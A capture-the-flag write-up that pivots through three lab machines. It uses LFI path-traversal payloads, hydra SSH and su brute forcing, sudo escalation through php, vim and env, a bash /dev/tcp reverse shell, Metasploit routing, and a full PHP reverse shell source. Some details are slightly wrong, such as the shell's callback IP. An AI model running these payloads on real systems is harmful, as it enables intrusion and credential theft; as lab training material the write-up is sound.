# Init

``` sh
sudo bash auto_deploy.sh inclusion.tar trust.tar upload.tar
```
# Reconnaissance  

Since this is the first time i'll be working on a challenge that involves multiple box and subnets let's go step by step

Firstly, i need to know which interface i'll be working with
``` sh
ip a
```
``` sh
27: br-bc8f8483be29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 5a:9b:34:8c:50:53 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.1/24 brd 10.10.10.255 scope global br-bc8f8483be29
       valid_lft forever preferred_lft forever
    inet6 fe80::589b:34ff:fe8c:5053/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
```

Then, i have to know the network this interface is providing me access to
```sh
ip route
```

```sh
10.10.10.0/24 dev br-bc8f8483be29 proto kernel scope link src 10.10.10.1
```

So, i can communicate with 254 hosts (if up) through the 10.10.10.1 gateway

Let's quick scan which hosts are up

``` sh 
sudo nmap -sn 10.10.10.0/24
```

``` sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 12:09 -0300
Nmap scan report for 10.10.10.2
Host is up (0.000077s latency).
MAC Address: 96:20:83:A3:F5:97 (Unknown)
Nmap scan report for 10.10.10.1
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.28 seconds
```

Found 
- The victim's IP: 10.10.10.2
- The gateway (me): 10.10.10.1

# Inclusion

## Ports scanning (TCP)

```sh
sudo nmap -sS -sC -sV -p- --open --min-rate 5000 -Pn 10.10.10.2
```

```sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 12:14 -0300
Nmap scan report for 10.10.10.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
|_  256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 96:20:83:A3:F5:97 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.71 seconds
```
## Web enumeration
### Dir Fuzzing

``` sh
gobuster dir -u http://10.10.10.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
```

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
shop                 (Status: 301) [Size: 307] [--> http://10.10.10.2/shop/]
server-status        (Status: 403) [Size: 275]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```
### LFI

Exploring the shop page there's a hint of a LFI vulnerability

``` sh
curl -s http://10.10.10.2/shop/ | grep GET
"Error de Sistema: ($_GET['archivo']");
```

``` sh
ffuf -u http://10.10.10.2/shop/index.php?archivo=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1112 -fw 372 | grep passwd

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.2/shop/index.php?archivo=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1112
 :: Filter           : Response words: 372
________________________________________________

../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 1ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 2ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 2ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 2ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 3ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 2ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 3ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 2ms]
../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 2ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 1ms]
../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 0ms]
../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 0ms]
../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 3ms]
../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 0ms]
../../../../etc/passwd  [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 0ms]
../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 1ms]
../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 2ms]
../../../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 4ms]
../../../../../../../etc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 4ms]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 0ms]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 87ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 2253, Words: 373, Lines: 69, Duration: 3736ms]
:: Progress: [930/930] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Trying any of those paths

``` sh
curl -s http://10.10.10.2/shop/index.php?archivo=../../../../../../../../../../../../../../../../../etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
```
### Brute force with hydra

While investigating how to RCE i kept a hydra running because the description of the machine hints that there is brute force

``` sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2 -u -vV -t 32
[22][ssh] host: 10.10.10.2   login: manchi   password: lovely
```
### SSH login

``` sh
ssh manchi@10.10.10.2
```

#### Hostname
``` sh
hostname
71a7af6a61d1
```
#### IPs
``` sh
hostname -I
10.10.10.2 20.20.20.2
```

Found 20.20.20.2 (Gateway to access next machine)
## Privilege escalation
##### manchi
#### Su force
Since this box is to practice brute forcing let's try this tool

In my kali let's run an http server

```sh
python3 -m http.service 5000
```

In the victim's 

``` sh
wget http://10.10.10.1:5000/Linux-Su-Force.sh
wget http://10.10.10.1:5000/rockyou.txt
chmod +x Linux-Su-Force.sh
```

``` sh
./Linux-Su-Force.sh seller rockyou.txt
Contraseña encontrada para el usuario seller: qwerty
```

``` sh
su seller
```
##### seller
#### Sudo misconfiguration
Looking for an escalation path

``` sh
sudo -l
(ALL) NOPASSWD: /usr/bin/php
```

``` sh
sudo -u root /usr/bin/php -r 'system("/bin/sh -i");'
```
##### root
# Trust
# Pivoting with metasploit

Firtly let's listen with **multi/handler** in metasploit
``` msfconsole
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.1:443
```

and run a reverse shell in the victim's host
``` sh
/bin/bash -i >& /dev/tcp/10.10.10.1/443 0>&1
```

once we got the reverse shell let's upgrade it to a **meterpreter**
``` msfconsole
msf post(multi/manage/shell_to_meterpreter) > run
```

finally let's add the route to the new subnet and port forward the data to the kali
``` msfconsole
msf post(multi/manage/shell_to_meterpreter) > route add 20.20.20.0 255.255.255.0 2
[*] Route added
```
discover the next's host IP with a bash one liner ping sweep
``` sh
for i in $(seq 254); do ping 20.20.20.$i -c1 -W1 & done | grep from
64 bytes from 20.20.20.2: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 20.20.20.3: icmp_seq=1 ttl=64 time=0.038 ms
```
## Ports scanning

``` msfconsole
msf auxiliary(scanner/portscan/tcp) > run
[+] 20.20.20.3            - 20.20.20.3:22 - TCP OPEN
[+] 20.20.20.3            - 20.20.20.3:80 - TCP OPEN
[*] 20.20.20.3            - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Web enumeration

Let's do port forwarding to see the web content
``` msfconsole
meterpreter > portfwd add -l 8000 -p 80 -r 20.20.20.3
[*] Forward TCP relay created: (local) :8000 -> (remote) 20.20.20.3:80
```

### Dir Fuzzing

``` sh
gobuster dir -u http://127.0.0.1:8000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
secret.php           (Status: 200) [Size: 927]
```

Looking at the content of secret.php
![[Pasted image 20260925140211.png]]

We enumerate the user **mario**
### Brute force with hydra

Let's port forward the ssh 22 port of the trust host to our kali's 2200 port
``` msfconsole
meterpreter > portfwd add -l 2200 -p 22 -r 20.20.20.3
[*] Forward TCP relay created: (local) :2200 -> (remote) 20.20.20.3:22
```

``` sh
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:2200 -t 32
[2200][ssh] host: 127.0.0.1   login: mario   password: chocolate
```
### SSH login

``` sh
ssh -p 2200 mario@127.0.0.1
```
#### hostname
``` sh
hostname
d885849a9cba
```
#### IPs
``` sh
hostname -i
20.20.20.3 30.30.30.2
```

30.30.30.0/24 is the subnet we are looking forward to access

## Privilege escalation
#### Sudo misconfiguration

```sh
sudo -l
(ALL) /usr/bin/vim
```

``` sh
sudo -u root /usr/bin/vim
```

Then using the command **!/bin/bash**
``` sh
whoami
root
```
#### Ping sweep
# Upload
# Pivoting with metasploit

Got a rev shell with **multi/handler** and upgraded it to a **meterpreter** and added the route to the new subnet
``` msfconsole
msf post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 20.20.20.2:4433 via the meterpreter on session 2
[*] Sending stage (1079144 bytes) to 20.20.20.3
[*] Meterpreter session 4 opened (Local Pipe -> Remote Pipe via session 2) at 2026-09-25 14:38:11 -0300
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf post(multi/manage/shell_to_meterpreter) > route add 30.30.30.0 255.255.255.0 4
[*] Route added
```

## Ports scanning

``` msfconsole
msf auxiliary(scanner/portscan/tcp) > run
[+] 30.30.30.3            - 30.30.30.3:80 - TCP OPEN
[*] 30.30.30.3            - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Web enumeration

#### Port forwarding
``` msfconsole
meterpreter > portfwd add -l 8888 -p 80 -r 30.30.30.3
[*] Forward TCP relay created: (local) :8888 -> (remote) 30.30.30.3:80
```
![[Pasted image 20260925145706.png]]
#### Reverse shell
Let's upload a payload.php with a reverse shell

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '30.30.30.3';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
By listening with **multi-handler** in msfconsole and running the php script in /uploads/payload.php like seen in previous boxes i got the revshell

#### hostname
``` sh
hostname
2f649d4ad862
```
#### IPs
``` sh
hostname -i
30.30.30.3
````
## Privilege escalation
#### Sudo misconfiguration
```sh
sudo -l
(root) NOPASSWD: /usr/bin/env
```

``` sh
sudo -u root /usr/bin/env /bin/bash
```

# The path followed

![[Pasted image 20260925151635.png]]